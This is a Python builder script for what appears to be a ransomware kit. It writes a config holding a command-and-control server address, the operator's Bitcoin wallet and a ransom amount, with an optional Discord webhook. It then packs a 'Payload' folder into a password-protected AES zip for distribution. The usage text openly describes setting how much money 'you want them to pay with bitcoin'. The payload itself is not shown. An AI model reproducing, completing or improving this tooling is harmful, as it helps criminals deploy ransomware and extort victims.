import sys, configparser, os, getpass, pyzipper

def build(server, wallet_address, port, zip_password, webhook_url, webhook_type, payment):
    config = configparser.ConfigParser()
    
    if port != "" :
        address = "http://" + server + ":" + port + "/"
    else:
        address = "http://" + server + ":8080/"
    config["domain"] = {
        "address" : address
    }


    if payment == "":
        paymentnum = "100"
    else:
        paymentnum = payment
    config["bitcoin"] = {
        "wallet" : wallet_address,
        "payment" : paymentnum
    }
        

    if webhook_url != "":
        if "https://" in webhook_url:
            webhook = webhook_url
        else:
            webhook = "https://" + webhook_url
        if webhook_type.lower() == "discord":
            pass
        elif webhook_type.lower() == "telegram":
            pass
        else:
            print("Invalid webhook type, quitting...")
            sys.exit()
        config["webhook"] = {
            "url" : webhook,
            "type" : webhook_type
        }
    else:
        config["webhook"] = {
            "url" : "false"
        }

    if os.path.exists("payload.zip"):
        print("cleaning old payload zip file.")
        os.remove("payload.zip")

    if os.path.exists("Payload/config.ini"):
        print("cleaning old config.ini")
        os.remove("Payload/config.ini")

    with open("Payload/config.ini", "w") as f:
        config.write(f)

    with pyzipper.AESZipFile("payload.zip", "w", compression=pyzipper.ZIP_DEFLATED) as zip:
        if zip_password != "":
            zip.setpassword(zip_password.encode("utf-8"))
            zip.encryption = pyzipper.WZ_AES
        for root, dirs, files in os.walk("Payload"):
            for file in files:
                filepath = os.path.join(root, file)
                zip.write(filepath)

    os.remove("Payload/config.ini")
    
if __name__ == "__main__":
    if len(sys.argv) <= 1:
        print("\nUSAGE: python3 builder.py -d cncserver.com -w btc_wallet_address [-p] [-zp -zpm] [-we] [-pa] [-t]\n\n" \
                "ARGS:\n\n" \
                "-d [cncserver.com] : command and control server ip/url (NO http[s]://)\n" \
                "-w [bitcoin wallet address] : command to program in your bitcoin wallet address\n" \
                "-p [4444] : command and control server port (DEFAULT 8080 IF NO FLAG PASSED)\n" \
                "-zp : prompt for archive password when zipping payload\n" \
                "-zpm [password] : manually enter archive password when zipping payload\n" \
                "-we [url] [type] : webhooking utility url and type [discord (telegram not supported as of now)]\n" \
                "-pa [ammount] : the ammount of money you want them to pay with bitcoin [in dollars, do not include the dollar sign] [default is 100]")
    else:
        argnum = 1
        domain = ""
        wallet = ""
        port = ""
        zip_password = ""
        webhook_url = ""
        webhook_type = ""
        payment = ""
        while True:
            if len(sys.argv) < argnum+1:
                if domain != "" and wallet != "":
                    build(domain, wallet, port, zip_password, webhook_url, webhook_type, payment)
                    sys.exit(0)
                else:
                    print("domain or wallet argument is missing (-d and -w)")
                    sys.exit()
            match sys.argv[argnum]:
                case "-d":
                    argnum += 1
                    if len(sys.argv) < argnum+1 or sys.argv[argnum].startswith("-") or sys.argv[argnum].endswith("-"):
                        print("invalid link type (invalid domain or arg is missing)")
                        sys.exit()
                    elif "https://" in sys.argv[argnum]:
                        print("invalid link type (contains http[s])")
                        sys.exit()
                    else:
                        domain = sys.argv[argnum]
                    argnum += 1
                case "-w":
                    argnum += 1
                    if len(sys.argv) < argnum+1 or sys.argv[argnum].startswith("-"):
                        print("invalid bitcoin wallet address")
                        sys.exit()
                    else:
                        wallet = sys.argv[argnum]
                    argnum += 1
                case "-p":
                    argnum += 1
                    if len(sys.argv) < argnum+1 or not sys.argv[argnum].isdigit():
                        print("invalid port number (is not an integer or arg is missing)")
                        sys.exit()
                    else:
                        port = sys.argv[argnum]
                    argnum += 1
                case "-zp":
                    while True:
                        password = getpass.getpass("Enter archive password: ")
                        confpasswd = getpass.getpass("Confirm archive password: ")
                        if password != confpasswd:
                            print("Passwords to not match.\n")
                            continue
                        break
                    zip_password = password
                    argnum += 1
                case "-zpm":
                    argnum += 1
                    if len(sys.argv) < argnum+1 or sys.argv[argnum].startswith("-"):
                        print("invalid zip password (starts with '-' or arg is missing)")
                        sys.exit()
                    else:
                        zip_password = sys.argv[argnum]
                    argnum += 1
                case "-we":
                    argnum += 1
                    if len(sys.argv) < argnum+1 or sys.argv[argnum].startswith("-") or not "." in sys.argv[argnum]:
                        print("invalid webhook link (wrong format or arg is missing)")
                        sys.exit()
                    else:
                        webhook_url = sys.argv[argnum]
                    argnum += 1
                    if len(sys.argv) < argnum+1 or sys.argv[argnum].startswith("-") or "." in sys.argv[argnum]:
                        print("invalid webhook type (contains '.', or arg is missing)")
                        sys.exit()
                    else:
                        match sys.argv[argnum]:
                            case "discord":
                                webhook_type = sys.argv[argnum]
                            case _:
                                print("invalid webhook type (something other than discord)")
                                sys.exit()
                    argnum += 1
                case "-pa":
                    argnum += 1
                    if len(sys.argv) < argnum+1 or sys.argv[argnum].startswith("-") or not sys.argv[argnum].isdigit():
                        print("invalid payment number (either is not a number or arg is missing)")
                        sys.exit()
                    else:
                        payment = sys.argv[argnum]
                    argnum += 1
                case _:
                    print("unrecognized argument: " + sys.argv[argnum])
                    sys.exit()
